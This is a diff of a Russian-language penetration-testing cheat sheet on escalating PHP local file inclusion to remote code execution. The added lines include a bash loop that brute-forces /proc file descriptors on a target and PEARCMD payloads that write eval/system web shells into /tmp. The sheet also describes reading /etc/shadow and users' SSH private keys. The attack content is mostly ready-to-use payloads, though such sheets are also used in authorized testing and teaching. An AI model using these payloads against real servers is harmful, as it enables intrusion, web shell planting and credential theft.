@@ -17,14 +17,29 @@
 * [LFI в RCE через PHP сессии](#LFI-в-RCE-через-PHP-сессии)
 * [LFI в RCE через PHP PEARCMD](#LFI-в-RCE-через-PHP-PEARCMD)
 * [LFI в RCE через файлы учетных данных](#LFI-в-RCE-через-файлы-учетных-данных)
+# [URL](#URL)
 
 # LFI в RCE через /proc/*/fd
 
 1. Загрузи множество шеллов (например: 100)
 2. Включи ```/proc/$PID/fd/$FD```, где $PID - идентификатор процесса, а $FD - файловый дескриптор. Оба можно подобрать брутфорсом.
-
+```bash
+for pid in {1..1000}; do
+    for fd in {0..20}; do
+        curl -s "http://target.com/vuln.php?page=/proc/$pid/fd/$fd" | grep -q "PHP" && echo "Found: $pid/$fd"
+    done
+done
+```
 ```python
 http://example.com/index.php?page=/proc/$PID/fd/$FD
+```
+
+* Через /proc/self/fd
+
+```
+http://target.com/vuln.php?page=/proc/self/fd/3
+http://target.com/vuln.php?page=/proc/self/fd/4
+http://target.com/vuln.php?page=/proc/self/fd/5
 ```
 
 # LFI в RCE через /proc/self/environ
@@ -304,12 +319,20 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 
 # LFI в RCE через PHP PEARCMD
 
-> PEAR - это фреймворк и система распространения для повторно используемых компонентов PHP. По умолчанию ```pearcmd.php``` устанавливается в каждом Docker PHP образе с [hub.docker.com](https://hub.docker.com/_/php) в ```/usr/local/lib/php/pearcmd.php```.
+> PEAR - это фреймворк и система распространения для повторно используемых компонентов PHP. По умолчанию ```pearcmd.php``` устанавливается в каждом Docker PHP образе с [hub.docker.com](https://hub.docker.com/_/php) в ```/usr/local/lib/php/pearcmd.php```, ```/usr/share/php/pearcmd.php```, ```/usr/lib/php/pearcmd.php```.
 
 Файл pearcmd.php использует ```$_SERVER['argv']``` для получения своих аргументов. Директива ```register_argc_argv``` должна быть установлена в On в конфигурации PHP (```php.ini```) для работы этой атаки.
 
 ```python
 register_argc_argv = On
+```
+
+Проверка настроек:
+
+```
+<?php phpinfo(); ?>
+
+<?php echo ini_get('register_argc_argv'); ?>
 ```
 
 Есть несколько способов эксплуатации:
@@ -320,6 +343,7 @@ register_argc_argv = On
 /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
 /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
 ```
+> +config-create+ - команда PEAR
 
 * Метод 2: man_dir
 
@@ -327,6 +351,9 @@ register_argc_argv = On
 /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
 /vuln.php?file=/tmp/exec.php&c=id
 ```
+* -c /tmp/phpinfo.php - создать конфиг
+* -d man_dir=<?echo(system($_GET['c']));?> - установить параметр с PHP кодом
+* -s - показать конфигурацию
 
 Созданный конфигурационный файл содержит веб-шелл.
 
@@ -375,3 +402,9 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 2. Затем взломай хеши внутри, чтобы войти через SSH на машину.
 
 > **Другой способ получить доступ SSH к машине Linux через LFI** - это чтение файла приватного SSH ключа: id_rsa. Если SSH активен, проверьте, какой пользователь используется в машине, включив содержимое /etc/passwd и попытайтесь получить доступ к /<HOME>/.ssh/id_rsa для каждого пользователя с домашним каталогом.
+
+
+# URL
+
+* [lfi2rce-via-php-filters.html](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html)
+* [php-lfi-with-nginx-assistance/](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
